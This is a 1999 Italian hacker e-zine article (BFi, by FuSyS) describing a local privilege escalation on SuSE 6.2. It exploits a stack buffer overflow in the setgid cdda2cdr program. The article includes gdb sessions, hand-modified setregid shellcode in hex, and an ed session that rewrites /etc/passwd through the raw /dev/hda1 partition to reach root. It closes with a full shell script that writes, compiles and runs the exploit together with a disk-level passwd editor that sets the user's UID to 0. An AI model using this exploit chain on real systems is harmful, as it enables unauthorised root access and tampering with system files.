@@ -1,0 +1,427 @@
+==============================================================================
+------------[ BFi numero 7, anno 2 - 25/12/1999 - file 11 di 22 ]-------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ HACKiNG SPiCCi0L0 - FuSyS
+
+
+		      -----[ Hacking Spicciolo ]-----
+
+			       della serie
+
+		    ---[anche i particolari contano]---
+
+
+	      NO(C)1999 FuSyS <fusys@s0ftpj.org> - [S0ftpj|BFi]
+
+
+Da un po' di tempo a questa parte, bELFaghor, del0rean e io ci stiamo dedicando
+alla ricerca di exploit locali mediante buffer overflow sullo stack ..... 
+In fondo, se e' vero che scrivere articoli e tool di sicurezza non e' male, e' 
+anche vero che sia comunque necessario trovare flaw ed errori nei sistemi per 
+poterli patchare a dovere. Come ormai sanno anche i sassi, questo tipo di 
+exploit permette di sfruttare alcune caratteristiche dei sistemi UNIX, del 
+linguaggio C e i vari errori di programmazione che infestano molto codice. 
+Se avete letto l'articolo di SirCondor [traduzione ed estensione dell'articolo 
+di Aleph1, tratto dal vol.48 di Phrack], potete iniziare allegramente a codare 
+da voi i vostri BOF.
+
+Devo dire che io e bELF ne abbiamo trovati alcuni, anche se purtroppo non erano
+u+s a root, ma piuttosto ad altri utenti o gruppi. Visto che su securityfocus
+sono usciti ultimamente alcuni BOF su SuSE 6.1, mi sono deciso ad installare
+la versione demo distribuita allo SMAU sul mio portatile.
+
+Oltre al BOF all'interno di sccw, ho trovato quasi subito un altro overflow in
+/usr/bin/cdda2cdr. Questo e' uscito anche su SecurityFocus come Linux cwdtools 
+Vulnerability con relativo codice per ottenere sgid disk su SuSE, il che mi
+ha privato della gioia di essere il primo [anche se in contemporanea].
+Ma ho deciso di aggiungere qualcosa ;) ....
+
+A questo punto mi sono reso conto di essere stato stupido a considerare alcuni
+degli overflow precedentemente trovati come inutili. Effettivamente, e questo
+non viene spesso considerato da molti amministratori di rete, l'ottenere nuovi
+privilegi rispetto a quelli concessi al proprio utente NON e' un semplice baco.
+Anzi puo' portare a grossi problemi in termini di DoS o di scalata a root.
+E questo mi e' balenato in mente con cdda2cdr sulla SuSE 6.2 ....
+
+Ma andiamo con ordine.
+
+All'inizio, dopo l'installazione, ho eseguito da root:
+
+FuZZy:~ # find / -type f \( -perm -04000 -o -perm -02000 \) > suidsgid
+
+in modo da poter ottenere tutti file suidati e sgidati del sistema in un comodo
+file. A questo punto sono partito abbastanza svogliatamente con il controllo di
+quelli meno noti, in modo da cercare qualche baco utile.
+
+Arrivato a cdda2cdr .... :
+
+fusys@FuZZy:~ > cdda2cdr -D `perl -e 'print "A" x 100'`
+cannot stat device AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+....
+fusys@FuZZy:~ > cdda2cdr -D `perl -e 'print "A" x 500'`
+Segmentation fault
+
+Hmmm. Interessante. Un occhio con gdb e' spesso utile in questi casi:
+
+FuZZy:~ # gdb /usr/bin/cdda2cdr
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i686-pc-linux-gnu"...
+(no debugging symbols found)...
+(gdb) run -D `perl -e 'print "A" x 500'`
+Starting program: /usr/bin/cdda2cdr -D `perl -e 'print "A" x 500'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info all eip
+eip            0x41414141       0x41414141
+(gdb)quit
+The program is running.  Exit anyway? (y or n) y
+FuZZy:~ #
+
+Quindi siamo effettivamente in grado di arrivare fino all' Instruction Pointer.
+Con un semplice codice, riguardatevi l'articolo di Aleph1 o la traduzione di
+SirCondor, il BOF era pronto:
+
+fusys@FuZZy:~ > ./cdd-xpl
+
+cdda2cdr V.0.3alpha (CDR v0.4) Xploit by FuSyS [S0ftpj|BFi]
+Using address: 0xbffff5a8
+
+sh-2.03$ id
+uid=100(fusys) gid=100(users) groups=100(users)
+
+?!?! Hmmm ... la shell viene eseguita, ma evidentemente /bin/sh non passa i
+privilegi.
+
+In effetti /bin/sh su SuSE 6.2 e' un link ad una bash 2.03. E dalla pagina man
+di bash 2.x :
+
+       If the shell is started with the effective user (group) id
+       not  equal  to the real user (group) id, and the -p option
+       is not supplied, no startup files are  read,  shell  func-
+       tions  are  not  inherited from the environment, the SHEL-
+       LOPTS variable, if  it  appears  in  the  environment,  is
+       ignored, and the effective user id is set to the real user
+       id.
+
+Quindi non e' possibile ottenere egid uguale a disk con il 'solito' shellcode
+che viene utilizzato nella stragrande maggioranza di exploit locali. A questo
+punto le scelte che ci si prospettano sono essenzialmente due. 
+
+1) Beh, piuttosto che perdere tempo nello shellcode, e' meglio far eseguire 
+   qualcosa d'altro mediante l'egg invece di /bin/sh : possiamo infatti usare 
+   setregid() passandogli lo sgid che cdda2cdr ci permette.
+
+		int main () {
+        		setregid(getegid(), getegid());
+        		system("/bin/bash");
+        		exit(0);
+		}
+
+   In questo modo potremo settare il nostro real-group-id con l'egid di news, 
+   per vedere la nuova istanza di bash regalarci i nuovi permessi. Come fare ?
+   Molto semplicemente compilate il codice suddetto e lanciatelo con ./nome al
+   posto di /bin/sh DIRETTAMENTE all'interno dello shellcode classico.
+   Questo e' il sistema con cui si presentano quasi tutti gli exploit del buon
+   Brock Tellier.
+
+2) Modificare lo shellcode di Aleph1 in modo che possa direttamente chiamare
+   setregid() PRIMA di chiamare execve() ed exit(), per ottenere i privilegi
+   necessari direttamente in bash2 anche senza il parametro -p. Ecco come si
+   presenta lo shellcode cosi' modificato:
+
+   char bash2shellcode[]="\xeb\x2d\x31\xc0\x31\xdb\x31\xc9\xb3\x06\xb1"
+   "\x06\xb0\x47\xcd\x80\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
+   "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40"
+   "\xcd\x80\xe8\xce\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+   Utilizzando questo, senza nessun codice esterno, potrete ottenere gid disk
+   direttamente con l'exploit, anche su bash2.
+
+Cambiando lo shellcode in uno dei due modi suddetti:
+
+fusys@FuZZy:~ > ./new-cdd-xpl
+
+cdda2cdr Xploit V.03alpha (CDR v0.4) by FuSyS [S0ftpj|BFi]
+Using address: 0xbffff5a8
+
+bash-2.03$ id
+uid=100(fusys) gid=6(disk) groups=100(users)
+
+Tombola. Abbiamo i permessi. Ma ora ?! Serve o meno avere egid uguale a 6 ?
+Serve eccome. Con alcuni codici, tipo Inews, possiamo ottenere privilegi utili,
+ma non direttamente per la scalata a root. Ma in questo caso le cose sono molto
+differenti ......
+
+Guardiamo un attimo dentro alla directory /dev :
+
+fusys@FuZZy:~ > ls -la /dev/ | grep disk
+
+......
+
+brw-rw----   1 root     disk       3,   0 Aug 23 10:00 hda
+brw-rw----   1 root     disk       3,   1 Aug 23 10:00 hda1
+brw-rw----   1 root     disk       3,  10 Aug 23 10:00 hda10
+brw-rw----   1 root     disk       3,  11 Aug 23 10:00 hda11
+brw-rw----   1 root     disk       3,  12 Aug 23 10:00 hda12
+brw-rw----   1 root     disk       3,  13 Aug 23 10:00 hda13
+brw-rw----   1 root     disk       3,  14 Aug 23 10:00 hda14
+brw-rw----   1 root     disk       3,  15 Aug 23 10:00 hda15
+brw-rw----   1 root     disk       3,   2 Aug 23 10:00 hda2
+brw-rw----   1 root     disk       3,   3 Aug 23 10:00 hda3
+brw-rw----   1 root     disk       3,   4 Aug 23 10:00 hda4
+brw-rw----   1 root     disk       3,   5 Aug 23 10:00 hda5
+brw-rw----   1 root     disk       3,   6 Aug 23 10:00 hda6
+brw-rw----   1 root     disk       3,   7 Aug 23 10:00 hda7
+brw-rw----   1 root     disk       3,   8 Aug 23 10:00 hda8
+brw-rw----   1 root     disk       3,   9 Aug 23 10:00 hda9
+
+......
+
+Molto interessante. Casualmente, sul mio portatile:
+
+FuZZy:~ # mount
+/dev/hda1 on / type ext2 (rw)
+proc on /proc type proc (rw)
+/dev/hda3 on /usr type ext2 (rw)
+/dev/hda5 on /home type ext2 (rw)
+
+Ed ora ho accesso in scrittura a /dev/hda1 ! Molto bene.
+Proviamo immediatamente qualcosa di simpatico:
+
+bash-2.03$ ed /dev/hda1
+6160384
+/fusys:x:100/
+fusys:x:100:100:FuSyS:/home/fusys:/bin/bash
+s/100/0/
+/fusys:x:/
+fusys:x:0:100:FuSyS:/home/fusys:/bin/bash
+wq
+126160382
+bash-2.03$ su - fusys
+FuZZy:~ # id
+uid=0(root) gid=100(users) groups=100(users)
+
+Box compromessa. Certo questo non e' sempre possibile. ed infatti mantiene un
+file di swap che guarda caso e' lungo come il file da editare. Un bel problema
+nel caso /etc fosse montata su una partizione molto piu' grande della mia.
+
+Quindi bisognerebbe codare un editor di partizioni che possa modificare al volo
+senza mantenere uno swap. Bisogna ricordare una cosa: la partizione NON e' un
+file sequenziale, anzi. Non e' proprio un file, anche se con ed possiamo avere
+accesso in scrittura. Ho preferito modificare il mio uid invece di aggiungere
+un nuovo utente. Questo infatti porterebbe delle altre modifiche all'interno
+del file, in quanto le dimensioni del file vengono gestite a livello di inode
+cui il kernel accede attraverso il VFS, sotto linux, e non in maniera diretta.
+
+Se nessuno di voi ha mai usato ed, beh, e' quello da usarsi quando ci si trova
+in rsh con sh -i come comando da eseguire. O anche meglio sed. Quello che ho
+fatto e' stato cercare la riga del mio utente nel file delle password, presente
+in /etc e modificare il mio uid, per poi scrivere le modifiche ed accedere ai
+nuovi privilegi. Ahhhh ..... adoro Linux e UN!X .....
+
+								FuSyS
+
+Ecco uno shell script che puo' essere utile per ovviare alla presenza di grandi
+partizioni. Ho pero' notato che si possono avere problemi se questo codice
+viene utilizzato piu' e piu' volte sulla stessa partizione. E' effettivamente
+abbastanza rude. Molto meglio sarebbe cambiare l' i_uid associato all'inode
+del file delle password. Ho fatto in modo che controllo solo l'interfaccia
+IDE primaria, niente hda3 e hda4, e niente SCSI. Fa il padding del GECOS solo
+per UID tra 10 e 999, quindi occhio a nobody e compagnia bella ..... :) fate
+qualcosa anche voi ;) Un altro lato particolare e' come il cambiamento possa
+avvenire nel sistema. In alcuni casi, un su - utente dara' subito la shell di
+root, in altri, bisogna attendere il sync del filesystem per il file in /etc,
+il reboot del sistem per vedere i nuovi privilegi confermati, o uscire e
+rientrare come utenti per syncare /etc/passwd .....
+
+Ecco comunque lo shell script per cdda2cdr, con lo shellcode modificato per
+usare setregid() esterno nel binario sgid. Se volete, cancellatelo ed usate
+il nuovo shellcode con setregid() interna, invece : 
+
+---------- snip ----------
+#!/bin/sh
+#
+# /usr/bin/cdda2cdr Xploit on SuSE 6.2
+# by FuSyS [S0ftPj|BFi]
+#
+
+USERNAME=`whoami`
+
+echo "Sto Copiando e Compilando l'Exploit ....."
+
+/bin/cat > cdda2cdr-xpl.c << EOF
+
+ #include <stdlib.h>
+
+ #define DEFAULT_OFFSET 	0
+ #define DEFAULT_BUFFER_SIZE 	500
+ #define DEFAULT_EGG_SIZE 	2048
+ #define NOP 			0x90
+ #define SUID			"/usr/bin/cdda2cdr"
+
+ char shellcode[] =
+ "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+ "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+ "\x80\xe8\xdc\xff\xff\xff./sgid";
+
+ unsigned long get_esp(void) {
+ 	__asm__("movl %esp,%eax");
+ }
+
+ int main(int argc, char *argv[]) {
+ 
+   char *buff, *ptr, *egg;
+   long *addr_ptr, addr;
+   int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+   int i, eggsize=DEFAULT_EGG_SIZE;
+   char comando[512];
+
+   printf("\ncdda2cdr Xploit V.03alpha (CDR v0.4) by FuSyS [S0ftPj|BFi]\n");
+
+   if (!(buff = malloc(bsize))) {
+ 	printf("Can't allocate memory.\n");
+ 	exit(0);
+   }
+   if (!(egg = malloc(eggsize))) {
+ 	printf("Can't allocate memory.\n");
+ 	exit(0);
+   }
+
+   addr = get_esp() - offset;
+   printf("Using address: 0x%x\n", addr);
+
+   ptr = buff;
+   addr_ptr = (long *) ptr;
+   for (i = 0; i < bsize; i+=4)
+   *(addr_ptr++) = addr;
+
+   ptr = egg;
+   for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
+ 	*(ptr++) = NOP;
+
+   for (i = 0; i < strlen(shellcode); i++)
+ 	*(ptr++) = shellcode[i];
+
+   buff[bsize - 1] = '\0';
+   egg[eggsize - 1] = '\0';
+
+   memcpy(egg,"EGG=",4);
+   putenv(egg);
+   snprintf(comando,511,"%s -D %s", SUID, buff);
+   system(comando);
+	exit(0);
+}
+
+EOF
+
+# se non volete usare sgid.c allora usate lo shellcode presentato in questo
+# articolo.
+
+/bin/cat > sgid.c << EOF
+
+int main () {
+	setregid(getegid(), getegid());
+	system("./raw");
+	exit(0);
+}
+
+EOF
+
+/bin/cat > rawdev.c << EOF
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <pwd.h>
+#include <string.h>
+
+#define PASSWD		"/etc/passwd"
+#define MAXBUFF		8*1024
+
+/*
+ * Questo codice accede solo ai dischi dell'interfaccia primaria IDE.
+ * Perche' ? Semplice. Fate qualcosa anche voi =;P
+ */
+
+int main () {
+
+	struct passwd *r00t;
+	struct stat statbuf;
+	int major, minor;
+	char disk[10];
+	char buffer[MAXBUFF], target[100];
+	FILE *fin;
+
+        r00t = getpwnam(getlogin());
+	stat(PASSWD, &statbuf);
+	major = statbuf.st_dev>>8;
+	minor = statbuf.st_dev&0xff;
+	
+	snprintf(target, 100, "%s:%s:%i:%i:%s:%s:%s", r00t->pw_name,
+		r00t->pw_passwd, r00t->pw_uid, r00t->pw_gid, r00t->pw_gecos,
+		r00t->pw_dir, r00t->pw_shell);
+
+	if(major==3) {
+	   snprintf(disk,10, "%s%i", 
+	     ((minor<64)?"/dev/hda":"/dev/hdb"),((minor<64)?minor:(minor-64)));
+	}
+
+	printf("\nModifico %s passando direttamente da %s\n", PASSWD, disk);
+	usleep(500);
+
+	if((fin=fopen(disk, "rb+"))==NULL) {
+		printf("Impossibile aprire %s\n", disk);
+		exit(1);
+	}
+
+	while((fgets(buffer, MAXBUFF, fin))!=NULL) {
+		if(strstr(buffer, target)) {
+			fseek(fin, -1*strlen(buffer), SEEK_CUR);
+			snprintf(target, 100, "%s:%s:0:%i:%s%s:%s:%s", 
+				r00t->pw_name, r00t->pw_passwd, 
+				r00t->pw_gid, r00t->pw_gecos, 
+				(r00t->pw_uid<100)?"x":"xx",
+				r00t->pw_dir, r00t->pw_shell);
+			strncpy(buffer, target, strlen(target));
+			fputs(buffer, fin);
+			printf("Ora %s ha UID uguale a 0 !\n\n", r00t->pw_name);
+			break;
+		}
+	}
+	fclose(fin);
+	exit(0);
+}
+
+EOF
+
+# se usate il mio shellcode allora cancellate anche la compilazione di sgid
+# oltre al sorgente su riportato
+
+/usr/bin/gcc -o cddxpl cdda2cdr-xpl.c
+/usr/bin/gcc -o sgid sgid.c
+/usr/bin/gcc -o raw rawdev.c
+
+./cddxpl
+
+# decidete voi se eseguire subito un su - utente o aspettare il sync del file
+# /etc/passwd
+
+#/bin/su - $USERNAME
+---------- snip ----------
+
+
+==============================================================================
+--------------------------------[ EOF 11/22 ]---------------------------------
+==============================================================================
